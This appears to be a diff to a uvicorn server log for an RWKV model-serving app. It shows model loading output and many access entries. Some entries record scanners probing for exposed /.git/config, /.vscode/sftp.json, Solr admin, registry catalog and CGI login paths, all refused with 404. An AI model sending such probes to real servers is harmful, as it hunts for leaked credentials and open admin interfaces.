@@ -2467,3 +2467,2678 @@ INFO:     175.27.137.229:57836 - "GET /robots.txt HTTP/1.0" 404 Not Found
 INFO:     175.27.137.229:57840 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
 INFO:     106.75.5.52:55444 - "GET /.git/config HTTP/1.1" 404 Not Found
 INFO:     159.75.198.97:54254 - "GET / HTTP/1.1" 200 OK
+--- 0.7173166275024414 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:34530 - "POST /switch-model HTTP/1.1" 200 OK
+INFO:     167.94.138.120:37632 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.120:60510 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.120:60518 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.120:60530 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     162.142.125.46:49756 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.46:59228 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.46:59242 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.46:59254 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.76:17510 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:52670 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:23180 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.105:23180 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:52704 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:24162 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.108:21864 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:23234 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:47408 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.34.31:53240 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:36058 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.104:36058 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:42060 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.105:43650 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:18024 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:29590 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     114.132.203.145:58808 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     159.75.198.6:27060 - "GET / HTTP/1.1" 200 OK
+INFO:     42.194.128.111:46011 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:59758 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:55140 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:55184 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.105:55200 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     52.83.91.65:49554 - "GET / HTTP/1.1" 200 OK
+INFO:     223.113.128.148:46958 - "GET / HTTP/1.1" 200 OK
+INFO:     154.212.141.142:36730 - "GET / HTTP/1.1" 200 OK
+INFO:     47.92.119.189:38904 - "GET / HTTP/1.0" 200 OK
+INFO:     47.92.119.189:39610 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.246:20626 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.151:60656 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:29774 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     106.55.200.233:35150 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:55222 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.144:55222 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:25226 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:60834 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.75:45874 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:45866 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:37100 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.108:37100 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:28002 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.251:51604 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:22790 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:22792 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     52.81.254.49:41954 - "GET / HTTP/1.1" 200 OK
+INFO:     52.81.254.49:41962 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     52.81.254.49:41964 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     52.81.254.49:41978 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     52.81.254.49:41968 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     206.168.34.206:48656 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.206:38340 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     206.168.34.206:38348 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     59.83.208.106:18920 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:47240 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:41940 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.104:41864 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.162.158:14984 - "GET / HTTP/1.1" 200 OK
+INFO:     129.211.162.158:14984 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:35290 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.104:59432 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:18420 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:21642 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:18462 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.15:18462 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:56866 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     129.211.162.158:9608 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:59502 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:43204 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     4.156.21.37:40404 - "GET / HTTP/1.1" 200 OK
+INFO:     159.75.198.232:30309 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.111:54158 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.111:35784 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.111:35836 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.111:35850 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     159.75.198.125:35139 - "GET / HTTP/1.1" 200 OK
+INFO:     223.165.4.49:45468 - "GET / HTTP/1.1" 200 OK
+INFO:     223.165.4.49:45484 - "GET //assets/logo.png HTTP/1.1" 200 OK
+INFO:     114.132.203.214:37914 - "GET //assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.100:59676 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.100:34486 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.100:34522 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.100:34586 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     159.75.198.232:22451 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.249:25474 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:29823 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.167.166:13695 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.146:34522 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.93:56384 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:34522 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:36074 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.75:37940 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:39862 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:29058 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:56886 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.125:56886 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:19918 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:34396 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:38048 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.101:36202 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     159.75.198.97:3697 - "GET / HTTP/1.1" 200 OK
+INFO:     106.75.5.52:48014 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     106.75.166.204:56210 - "GET /.vscode/sftp.json HTTP/1.1" 404 Not Found
+INFO:     172.232.194.197:27763 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.218.101:5960 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.206.34:35066 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.219.28:47250 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.218.101:5970 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     172.232.219.19:4340 - "GET / HTTP/1.1" 200 OK
+INFO:     106.75.137.241:45580 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     180.101.245.249:29172 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:38499 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:51402 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.101:51402 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:46736 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:44870 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.73:56518 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:19306 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:52380 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     220.196.160.75:41484 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     180.101.245.247:35666 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.104:64804 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:27694 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.15:27694 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:37892 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.246:32356 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:53736 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:55262 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     167.94.138.120:42442 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.120:42514 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.120:42562 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.120:42592 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.146.51:57562 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.51:59118 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.51:59168 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.51:59190 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.46:33420 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.46:39522 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.46:39536 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.46:39538 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.83:36968 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.25.245:16589 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:37516 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.12:37516 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.162.87:61696 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:35814 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:37558 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.106:31074 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:54670 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:53791 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:60296 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.51:60296 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:57750 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.51:60656 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:57756 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:53634 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.16:18042 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:54600 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:34034 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.146:34034 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:46116 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:19472 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:31336 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:31338 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     185.180.140.4:54822 - "GET / HTTP/1.1" 200 OK
+INFO:     185.180.140.4:37526 - "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 404 Not Found
+INFO:     106.52.65.240:41737 - "GET / HTTP/1.1" 200 OK
+INFO:     4.151.229.42:34426 - "GET / HTTP/1.1" 200 OK
+INFO:     173.255.221.189:34631 - "GET / HTTP/1.1" 200 OK
+INFO:     45.79.172.21:30212 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.146:55194 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.3.160:21562 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:28246 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.117:28246 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:29742 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.144:52612 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:37952 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:24976 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     159.75.198.6:1166 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.104:19464 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.246:63769 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:50422 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.105:50422 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:50456 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.252:43752 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:43756 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:20382 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     162.142.125.212:54162 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.212:40530 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.212:40600 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.212:40620 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     206.168.34.32:38638 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.32:45980 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.32:46008 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     206.168.34.32:46016 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     180.101.245.246:23068 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.246:64539 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:26872 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.247:26872 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.162.158:37577 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:19430 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.253:53384 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:29746 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:24268 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.246:46554 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:38688 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.103:38688 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:57538 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:41226 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:24560 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.108:28830 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     52.76.71.100:21661 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     42.193.132.157:51502 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:42552 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:47232 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.105:47300 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.105:47306 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     59.83.208.105:39842 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.246:47581 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:51784 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.61:51784 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:29104 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:29102 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:19394 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:38014 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     23.95.200.178:43114 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.14:24146 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.211.44:4784 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:18430 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.95:18430 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:40918 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.95:18462 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:40038 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:54166 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:25852 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:14459 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:46382 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.249:46382 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:54254 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:35800 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:54256 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:57604 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     106.55.245.27:33135 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.144:18524 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.35.33:63978 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:24644 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.96:24644 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:18312 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.124:21420 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:27386 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:27388 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     167.94.145.110:41754 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.110:41874 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.110:41906 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.110:41936 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     165.154.128.17:58672 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.128.17:39066 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     180.101.245.251:24150 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.213.48:42291 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:35474 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.13:35474 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:47576 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.103:53706 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:53708 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:20340 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     172.232.195.77:25341 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.203.43:17930 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.203.47:51732 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     172.232.195.21:53958 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.203.47:51724 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.203.43:17914 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.203.43:17942 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:5323 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     180.101.245.251:22926 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.213.48:62700 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:42520 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.248:42520 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:25876 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.108:29480 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:50066 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:43806 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     172.232.195.44:24025 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.195.11:51870 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.203.51:47142 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.195.6:16478 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.195.6:16488 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.203.52:26150 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     172.232.195.11:22090 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:63983 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     172.232.203.20:29795 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.195.21:2474 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.203.38:38224 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.203.38:38218 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     172.232.195.6:54370 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.203.36:15996 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.195.6:54380 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:14110 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     180.101.244.16:49632 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:33860 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     59.83.208.103:23326 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     220.196.160.61:36088 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:8521 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:58864 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.101:58864 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:32844 - "GET /assets/uuid.js HTTP/1.1" 200 OK
